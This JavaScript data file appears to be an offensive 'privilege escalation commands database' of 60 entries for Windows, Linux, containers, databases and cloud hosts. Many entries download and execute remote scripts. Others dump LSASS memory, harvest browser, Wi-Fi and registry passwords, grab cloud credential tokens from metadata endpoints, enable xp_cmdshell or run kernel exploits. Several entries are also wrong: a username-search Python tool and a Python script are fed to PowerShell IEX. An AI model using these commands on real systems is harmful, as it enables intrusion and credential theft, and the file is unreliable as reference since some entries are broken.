// Privilege Escalation Commands Database

const PRIVILEGE_ESCALATION_COMMANDS = {
    "Windows Privilege Escalation": [
        { id: 1, name: "WinPEAS", command: "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"", description: "Windows Privilege Escalation Awesome Scripts", category: "Windows PrivEsc" },
        { id: 2, name: "PowerUp", command: "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks\"", description: "PowerShell privilege escalation framework", category: "Windows PrivEsc" },
        { id: 3, name: "Sherlock", command: "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sherlock-project/sherlock/master/sherlock.py')\"", description: "Find missing patches for privilege escalation", category: "Windows PrivEsc" },
        { id: 4, name: "UAC Bypass Check", command: "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", description: "Check UAC configuration", category: "Windows PrivEsc" },
        { id: 5, name: "Always Install Elevated", command: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", description: "Check AlwaysInstallElevated registry setting", category: "Windows PrivEsc" },
        { id: 6, name: "Unquoted Service Paths", command: "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"", description: "Find unquoted service paths", category: "Windows PrivEsc" },
        { id: 7, name: "Service Permissions", command: "accesschk.exe /accepteula -uwcqv \"Authenticated Users\" *", description: "Check service permissions", category: "Windows PrivEsc" },
        { id: 8, name: "Weak Service Binaries", command: "for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"Pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt & @echo. >> c:\\windows\\temp\\permissions.txt && for /f eol=\" tokens=*\" %b in (c:\\windows\\temp\\permissions.txt) do @(@icacls \"%b\" 2>nul | findstr \"(M)\\|(F)\" | findstr \"Everyone\\|BUILTIN\\\\Users\\|NT AUTHORITY\\\\Authenticated Users\" && @echo.)", description: "Find weak service binary permissions", category: "Windows PrivEsc" },
        { id: 9, name: "Registry AutoRuns", command: "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", description: "Check registry autoruns", category: "Windows PrivEsc" },
        { id: 10, name: "Scheduled Tasks", command: "schtasks /query /fo LIST /v | findstr TaskName", description: "List scheduled tasks", category: "Windows PrivEsc" },
        { id: 11, name: "DLL Hijacking Check", command: "for /f \"delims=\" %i in ('dir /s /b *.dll 2^>nul ^| findstr /v system32') do @echo %i && @icacls \"%i\" | findstr \"(F)\\|(M)\" | findstr \"Everyone\\|BUILTIN\\\\Users\\|NT AUTHORITY\\\\Authenticated Users\"", description: "Check for DLL hijacking opportunities", category: "Windows PrivEsc" },
        { id: 12, name: "Token Impersonation", command: "whoami /priv", description: "Check token privileges", category: "Windows PrivEsc" },
        { id: 13, name: "Potato Attacks", command: "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/antonioCoco/RogueWinRM/master/RogueWinRM.ps1')\"", description: "Potato attack for privilege escalation", category: "Windows PrivEsc" },
        { id: 14, name: "PrintSpoofer", command: ".\\PrintSpoofer.exe -i -c cmd", description: "PrintSpoofer privilege escalation", category: "Windows PrivEsc" },
        { id: 15, name: "JuicyPotato", command: ".\\JuicyPotato.exe -l 1337 -p cmd.exe -t *", description: "JuicyPotato privilege escalation", category: "Windows PrivEsc" }
    ],
    
    "Linux Privilege Escalation": [
        { id: 16, name: "LinPEAS", command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", description: "Linux Privilege Escalation Awesome Script", category: "Linux PrivEsc" },
        { id: 17, name: "LinEnum", command: "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh", description: "Linux enumeration script", category: "Linux PrivEsc" },
        { id: 18, name: "Linux Smart Enumeration", command: "wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && chmod +x lse.sh && ./lse.sh", description: "Smart Linux enumeration", category: "Linux PrivEsc" },
        { id: 19, name: "SUID Binaries", command: "find / -perm -u=s -type f 2>/dev/null", description: "Find SUID binaries", category: "Linux PrivEsc" },
        { id: 20, name: "SGID Binaries", command: "find / -perm -g=s -type f 2>/dev/null", description: "Find SGID binaries", category: "Linux PrivEsc" },
        { id: 21, name: "World Writable Files", command: "find / -perm -2 -type f 2>/dev/null", description: "Find world-writable files", category: "Linux PrivEsc" },
        { id: 22, name: "World Writable Directories", command: "find / -perm -2 -type d 2>/dev/null", description: "Find world-writable directories", category: "Linux PrivEsc" },
        { id: 23, name: "Sudo Rights", command: "sudo -l", description: "Check sudo permissions", category: "Linux PrivEsc" },
        { id: 24, name: "Capabilities", command: "getcap -r / 2>/dev/null", description: "Find files with capabilities", category: "Linux PrivEsc" },
        { id: 25, name: "Cron Jobs", command: "cat /etc/crontab && ls -la /etc/cron*", description: "Check cron jobs", category: "Linux PrivEsc" },
        { id: 26, name: "Writable /etc/passwd", command: "ls -la /etc/passwd", description: "Check if /etc/passwd is writable", category: "Linux PrivEsc" },
        { id: 27, name: "SSH Keys", command: "find / -name \"*.pem\" -o -name \"*_rsa\" -o -name \"*_dsa\" -o -name \"*_ed25519\" 2>/dev/null", description: "Find SSH private keys", category: "Linux PrivEsc" },
        { id: 28, name: "History Files", command: "find / -name \".*history\" -type f 2>/dev/null | xargs cat", description: "Check history files for sensitive info", category: "Linux PrivEsc" },
        { id: 29, name: "Configuration Files", command: "find /etc -name '*.conf' 2>/dev/null | head -20", description: "Find configuration files", category: "Linux PrivEsc" },
        { id: 30, name: "Running Processes", command: "ps aux | grep root", description: "Check running processes as root", category: "Linux PrivEsc" },
        { id: 31, name: "Network Services", command: "netstat -tulpn", description: "Check network services", category: "Linux PrivEsc" },
        { id: 32, name: "Kernel Version", command: "uname -a && cat /proc/version", description: "Check kernel version for exploits", category: "Linux PrivEsc" },
        { id: 33, name: "OS Information", command: "cat /etc/os-release", description: "Get OS information", category: "Linux PrivEsc" },
        { id: 34, name: "Environment Variables", command: "env | grep -i path", description: "Check PATH and other environment variables", category: "Linux PrivEsc" },
        { id: 35, name: "GTFOBins Check", command: "which vim && which nano && which less && which more", description: "Check for GTFOBins utilities", category: "Linux PrivEsc" }
    ],
    
    "Kernel Exploits": [
        { id: 36, name: "Linux Exploit Suggester", command: "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh", description: "Linux kernel exploit suggester", category: "Kernel Exploits" },
        { id: 37, name: "Windows Exploit Suggester", command: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py')\"", description: "Windows exploit suggester", category: "Kernel Exploits" },
        { id: 38, name: "DirtyCow", command: "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty", description: "DirtyCow privilege escalation", category: "Kernel Exploits" },
        { id: 39, name: "Overlayfs", command: "gcc ofs.c -o ofs && ./ofs", description: "Overlayfs privilege escalation", category: "Kernel Exploits" },
        { id: 40, name: "MS16-032", command: "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1'); Invoke-MS16032\"", description: "MS16-032 secondary logon service exploit", category: "Kernel Exploits" }
    ],
    
    "Container Escape": [
        { id: 41, name: "Docker Escape Check", command: "fdisk -l 2>/dev/null | grep -i 'disk\\|partition'", description: "Check for host disk access in container", category: "Container Escape" },
        { id: 42, name: "Container Capabilities", command: "capsh --print", description: "Check container capabilities", category: "Container Escape" },
        { id: 43, name: "Docker Socket", command: "ls -la /var/run/docker.sock", description: "Check for Docker socket access", category: "Container Escape" },
        { id: 44, name: "Privileged Container", command: "cat /proc/1/cgroup | grep -i docker", description: "Check if running in privileged container", category: "Container Escape" },
        { id: 45, name: "Kubernetes Service Account", command: "ls -la /var/run/secrets/kubernetes.io/serviceaccount/", description: "Check Kubernetes service account tokens", category: "Container Escape" }
    ],
    
    "Database Privilege Escalation": [
        { id: 46, name: "MySQL UDF", command: "SELECT * FROM mysql.func WHERE name = 'sys_exec';", description: "Check for User Defined Functions in MySQL", category: "Database PrivEsc" },
        { id: 47, name: "MSSQL xp_cmdshell", command: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", description: "Enable xp_cmdshell in MSSQL", category: "Database PrivEsc" },
        { id: 48, name: "PostgreSQL Extensions", command: "SELECT * FROM pg_available_extensions WHERE name LIKE '%plpython%';", description: "Check for dangerous PostgreSQL extensions", category: "Database PrivEsc" },
        { id: 49, name: "Oracle Java Privileges", command: "SELECT * FROM dba_java_policy;", description: "Check Oracle Java privileges", category: "Database PrivEsc" },
        { id: 50, name: "MongoDB Privilege Escalation", command: "db.runCommand({listCollections: 1})", description: "Check MongoDB collection privileges", category: "Database PrivEsc" }
    ],
    
    "Cloud Privilege Escalation": [
        { id: 51, name: "AWS Instance Metadata", command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", description: "Check AWS instance metadata", category: "Cloud PrivEsc" },
        { id: 52, name: "Azure Instance Metadata", command: "curl -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'", description: "Check Azure instance metadata", category: "Cloud PrivEsc" },
        { id: 53, name: "GCP Instance Metadata", command: "curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'", description: "Check GCP instance metadata", category: "Cloud PrivEsc" },
        { id: 54, name: "AWS CLI Profile", command: "aws configure list", description: "Check AWS CLI configuration", category: "Cloud PrivEsc" },
        { id: 55, name: "AWS S3 Buckets", command: "aws s3 ls", description: "List accessible S3 buckets", category: "Cloud PrivEsc" }
    ],
    
    "Application Privilege Escalation": [
        { id: 56, name: "Chrome Saved Passwords", command: "powershell -c \"Get-Content '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data'\"", description: "Extract Chrome saved passwords", category: "Application PrivEsc" },
        { id: 57, name: "Firefox Saved Passwords", command: "ls ~/.mozilla/firefox/*/logins.json", description: "Find Firefox saved passwords", category: "Application PrivEsc" },
        { id: 58, name: "WiFi Passwords", command: "netsh wlan show profile name=\"{wifi_name}\" key=clear", description: "Extract WiFi passwords on Windows", category: "Application PrivEsc" },
        { id: 59, name: "Registry Credentials", command: "reg query HKLM /f password /t REG_SZ /s", description: "Search registry for passwords", category: "Application PrivEsc" },
        { id: 60, name: "Memory Dump Credentials", command: "procdump -ma lsass.exe lsass.dmp", description: "Dump LSASS process memory", category: "Application PrivEsc" }
    ]
};